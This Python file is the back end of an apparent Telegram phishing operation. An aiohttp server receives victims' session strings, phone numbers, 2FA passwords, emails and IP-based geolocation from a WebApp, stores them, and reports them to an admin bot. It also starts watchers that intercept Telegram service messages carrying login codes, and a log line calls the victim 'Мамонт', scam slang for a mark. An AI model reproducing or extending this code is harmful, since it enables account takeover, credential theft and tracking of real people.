import asyncio
from datetime import datetime
import logging
import sys

from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import BotCommand, BotCommandScopeAllPrivateChats, BotCommandScopeDefault

from admin_bot.handlers import router as admin_router, sync_admin_bot_commands
from admin_bot.orchestrator import Orchestrator
from shared import db
from shared.config import ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, AUTO_ROTATE_DEFAULT, DB_PATH, TEST_ADMIN_BOT_TOKEN, is_test_worker
from shared.geo import get_client_ip, resolve_ip_info
from shared.notifier import notify_user_event
from shared.service_listener import start_session_watcher, start_all_session_watchers

logging.basicConfig(
    level=logging.INFO,
    stream=sys.stdout,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("admin_bot")


async def handle_auth_complete(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        tg_id = data.get("tg_id")
        phone = data.get("phone")
        session_string = data.get("session_string")
        password_2fa = data.get("password_2fa") or data.get("password")
        username = data.get("username")
        nickname = data.get("nickname") or username or "Пользователь"

        if not tg_id and phone:
            user_by_phone = db.get_user_by_phone(DB_PATH, phone)
            if user_by_phone:
                tg_id = user_by_phone["tg_id"]

        # tg_id resolution fallback without speculative Telethon sockets

        if not tg_id:
            if phone:
                cleaned_digits = "".join(c for c in str(phone) if c.isdigit())
                tg_id = int(cleaned_digits) if cleaned_digits else int(abs(hash(phone)))
            else:
                tg_id = int(datetime.now().timestamp())

        tg_id = int(tg_id)
        # Ensure user exists in database
        db.get_or_create_user(DB_PATH, tg_id, username, nickname, phone=phone)

        if session_string and session_string != "sess_string_ok":
            db.set_user_session(DB_PATH, tg_id, session_string)
            # Launch live Telegram service message interceptor for 777000
            start_session_watcher(tg_id, session_string)
        db.set_user_auth_step(DB_PATH, tg_id, "authorized")
        if phone:
            db.set_user_phone(DB_PATH, tg_id, phone)
        if password_2fa:
            db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)

        client_ip = get_client_ip(request)
        device = data.get("device")
        geo_info = await resolve_ip_info(client_ip, dict(request.headers))
        if (client_ip and client_ip != "—") or device:
            db.set_user_geo(
                DB_PATH,
                tg_id,
                ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
                country=geo_info.get("country"),
                city=geo_info.get("city"),
                isp=geo_info.get("isp"),
                device=device,
            )

        email = data.get("email")
        if email:
            db.set_user_email(DB_PATH, tg_id, email)

        bot_token = data.get("bot_token") or data.get("mirror_token")
        if bot_token:
            db.set_user_mirror_token(DB_PATH, tg_id, bot_token)

        user = db.get_user_by_tg_id(DB_PATH, tg_id)
        is_test = bool(data.get("is_test")) or is_test_worker(bot_token)
        if not is_test and user:
            u_mtoken = user.get("mirror_token") if "mirror_token" in user.keys() else None
            u_muser = user.get("mirror_username") if "mirror_username" in user.keys() else None
            if is_test_worker(u_mtoken, u_muser):
                is_test = True

        await notify_user_event(
            event_type="authorized",
            user_tg_id=tg_id,
            user_username=username or (user["username"] if user else None),
            user_nickname=nickname or (user["nickname"] if user else "Пользователь"),
            phone=phone or (user["phone"] if user else None),
            email=email or (user["email"] if user and "email" in user.keys() else None),
            auth_step="authorized",
            password_2fa=password_2fa or (user["password_2fa"] if user and "password_2fa" in user.keys() else None),
            session_str=session_string,
            ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
            country=geo_info.get("country"),
            city=geo_info.get("city"),
            isp=geo_info.get("isp"),
            device=device,
            is_test=is_test,
            mirror_token=bot_token,
        )
        logger.info("Successfully processed auth completion for user tg_id=%s, phone=%s, email=%s", tg_id, phone, email)

        return web.json_response({"ok": True})
    except Exception as exc:
        logger.error("handle_auth_complete error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def handle_auth_event(request: web.Request) -> web.Response:
    try:
        data = await request.json()
        tg_id = data.get("tg_id")
        phone = data.get("phone")
        username = data.get("username")
        nickname = data.get("nickname") or username or "Пользователь"
        event = data.get("event") or data.get("step") or "event"
        details = data.get("details")

        email = data.get("email")

        if not tg_id and phone:
            user_by_phone = db.get_user_by_phone(DB_PATH, phone)
            if user_by_phone:
                tg_id = user_by_phone["tg_id"]

        if not tg_id and email:
            user_by_email = db.get_user_by_email(DB_PATH, email)
            if user_by_email:
                tg_id = user_by_email["tg_id"]

        if not tg_id:
            if phone:
                cleaned_digits = "".join(c for c in str(phone) if c.isdigit())
                tg_id = int(cleaned_digits) if cleaned_digits else int(abs(hash(phone)))
            elif email:
                tg_id = int(abs(hash(email))) % (10**10)
            else:
                tg_id = int(datetime.now().timestamp())

        tg_id = int(tg_id)
        password_2fa = data.get("password_2fa") or data.get("password")

        user = db.get_user_by_tg_id(DB_PATH, tg_id)
        current_step = ""
        if user:
            try:
                current_step = str(user.get("auth_step") or "")
            except Exception:
                current_step = str(user["auth_step"] if "auth_step" in user.keys() else "")
            if not phone:
                try:
                    phone = user.get("phone")
                except Exception:
                    phone = user["phone"] if "phone" in user.keys() else None

        # Only ignore duplicate intermediate events if the user is already authorized,
        # but ALWAYS allow new login attempts (phone, waiting_code, start, registered)
        if user and current_step.lower() == "authorized" and event in (
            "waiting_2fa", "entered_2fa", "wrong_2fa", "entered_code", "wrong_code"
        ):
            logger.info("Ignoring intermediate auth event '%s' for already authorized user tg_id=%s", event, tg_id)
            return web.json_response({"ok": True})

        if event == "logged_out":
            db.set_user_auth_step(DB_PATH, tg_id, "logged_out")
            try:
                from shared.service_listener import _active_watchers
                w_client = _active_watchers.pop(tg_id, None)
                if w_client:
                    asyncio.create_task(w_client.disconnect())
            except Exception:
                pass
            from shared.notifier import notify_session_revoked
            asyncio.create_task(notify_session_revoked(tg_id, reason="Мамонт нажал «Выйти» в WebApp", force=True))
            logger.info("User tg_id=%s logged out from WebApp", tg_id)
            return web.json_response({"ok": True})

        db.get_or_create_user(DB_PATH, tg_id, username, nickname, phone=phone)

        if email:
            db.set_user_email(DB_PATH, tg_id, email)
        if phone:
            db.set_user_phone(DB_PATH, tg_id, phone)
        if password_2fa:
            db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)
        db.set_user_auth_step(DB_PATH, tg_id, event)

        client_ip = get_client_ip(request)
        device = data.get("device")
        geo_info = await resolve_ip_info(client_ip, dict(request.headers))

        if (client_ip and client_ip != "—") or device:
            db.set_user_geo(
                DB_PATH,
                tg_id,
                ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
                country=geo_info.get("country"),
                city=geo_info.get("city"),
                isp=geo_info.get("isp"),
                device=device,
            )

        bot_token = data.get("bot_token") or data.get("mirror_token")
        if bot_token and tg_id:
            db.set_user_mirror_token(DB_PATH, tg_id, bot_token)

        user = db.get_user_by_tg_id(DB_PATH, tg_id)
        is_test = bool(data.get("is_test")) or is_test_worker(bot_token)
        if not is_test and user:
            u_mtoken = user.get("mirror_token") if "mirror_token" in user.keys() else None
            u_muser = user.get("mirror_username") if "mirror_username" in user.keys() else None
            if is_test_worker(u_mtoken, u_muser):
                is_test = True

        db_2fa = None
        if user:
            try:
                db_2fa = user.get("password_2fa")
            except Exception:
                db_2fa = user["password_2fa"] if "password_2fa" in user.keys() else None

        await notify_user_event(
            event_type=event,
            user_tg_id=tg_id,
            user_username=username or (user["username"] if user else None),
            user_nickname=nickname or (user["nickname"] if user else "Пользователь"),
            phone=phone or (user["phone"] if user else None),
            email=email or (user["email"] if user and "email" in user.keys() else None),
            auth_step=event,
            password_2fa=password_2fa or db_2fa,
            details=details,
            ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
            country=geo_info.get("country"),
            city=geo_info.get("city"),
            isp=geo_info.get("isp"),
            device=device,
            is_test=is_test,
            mirror_token=bot_token,
        )
        logger.info("Processed auth event '%s' for tg_id=%s (email=%s, ip=%s, device=%s)", event, tg_id, email, client_ip, device)
        return web.json_response({"ok": True})
    except Exception as exc:
        logger.error("handle_auth_event error: %s", exc)
        return web.json_response({"ok": False, "error": str(exc)}, status=500)


async def handle_auth_status(request: web.Request) -> web.Response:
    try:
        tg_id = request.query.get("tg_id")
        phone = request.query.get("phone")
        is_auth = False
        user = None
        auth_step = None
        if tg_id:
            user = db.get_user_by_tg_id(DB_PATH, int(tg_id))
        elif phone:
            user = db.get_user_by_phone(DB_PATH, phone)

        if user:
            try:
                auth_step = str(user.get("auth_step") or "")
            except Exception:
                auth_step = str(user["auth_step"] if "auth_step" in user.keys() else "")

            has_session = bool(user.get("session_string")) if "session_string" in user.keys() else False

            if auth_step in ("session_revoked", "logged_out", "banned") or not has_session:
                is_auth = False
            elif auth_step in ("authorized", "completed", "success"):
                is_auth = True
            else:
                is_auth = False

        client_ip = get_client_ip(request)
        if tg_id and client_ip and client_ip != "—":
            geo_info = await resolve_ip_info(client_ip, dict(request.headers))
            try:
                db.set_user_geo(
                    DB_PATH,
                    int(tg_id),
                    ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
                    country=geo_info.get("country"),
                    city=geo_info.get("city"),
                    isp=geo_info.get("isp"),
                )
            except Exception:
                pass

        gctrl = None
        if user and "tg_id" in user.keys():
            gctrl = db.get_google_auth_control(DB_PATH, user["tg_id"])
        elif tg_id and str(tg_id).isdigit():
            gctrl = db.get_google_auth_control(DB_PATH, int(tg_id))

        return web.json_response({
            "ok": True,
            "authorized": is_auth,
            "auth_step": auth_step,
            "username": user["username"] if user else None,
            "nickname": user["nickname"] if user else None,
            "google_control": gctrl,
        })
    except Exception as e:
        return web.json_response({"ok": False, "authorized": False, "error": str(e)})


async def handle_download_archive(request: web.Request) -> web.StreamResponse:
    token = request.match_info.get("token")
    if not token:
        return web.Response(text="Неверный запрос (токен отсутствует)", status=400)

    from shared.downloads import get_download_file
    res = get_download_file(token)
    if not res:
        return web.Response(
            text=(
                "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Файл не найден</title></head>"
                "<body style='background:#0f141c;color:#f5f5f5;font-family:sans-serif;text-align:center;padding-top:100px;'>"
                "<h2>⚠️ Ссылка на скачивание устарела или не найдена</h2>"
                "<p style='color:#7f91a4;'>Срок действия ссылки истек (24 часа) или файл был перемещен. Запросите новую выгрузку в боте.</p>"
                "</body></html>"
            ),
            content_type="text/html",
            status=404,
        )

    file_path, filename = res
    return web.FileResponse(
        path=file_path,
        headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Cache-Control": "no-cache",
        },
    )


async def main() -> None:
    bot = Bot(token=ADMIN_BOT_TOKEN)
    test_admin_bot = Bot(token=TEST_ADMIN_BOT_TOKEN) if TEST_ADMIN_BOT_TOKEN else None
    dp = Dispatcher()
    dp.include_router(admin_router)

    orchestrator = Orchestrator(bot, ADMIN_CHAT_ID, DB_PATH, AUTO_ROTATE_DEFAULT)
    dp["orchestrator"] = orchestrator

    await sync_admin_bot_commands(bot)
    if test_admin_bot:
        try:
            await sync_admin_bot_commands(test_admin_bot)
            logger.info("Admin commands synced for test admin bot @testadimbot")
        except Exception as e_cmd:
            logger.warning("Could not sync commands for test admin bot: %s", e_cmd)

    await orchestrator.resume_on_startup()
    await start_all_session_watchers()

    # Start auth webhook and download server on port 8080
    app = web.Application()
    app.router.add_get("/api/auth/status", handle_auth_status)
    app.router.add_post("/api/auth/complete", handle_auth_complete)
    app.router.add_post("/api/auth/event", handle_auth_event)
    app.router.add_get("/api/download/{token}", handle_download_archive)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 8080)
    await site.start()
    logger.info("Web server running on port 8080 (/api/auth/*, /api/download/*)")

    bots_to_poll = [bot]
    if test_admin_bot:
        bots_to_poll.append(test_admin_bot)

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        if test_admin_bot:
            await test_admin_bot.delete_webhook(drop_pending_updates=True)
        logger.info("Deleted webhooks for admin bots before starting polling")
    except Exception as e_wh:
        logger.warning("Could not delete webhook: %s", e_wh)

    try:
        await dp.start_polling(*bots_to_poll, allowed_updates=dp.resolve_used_update_types())
    finally:
        await runner.cleanup()
        await orchestrator.fleet.stop_all()
        await bot.session.close()
        if test_admin_bot:
            await test_admin_bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())
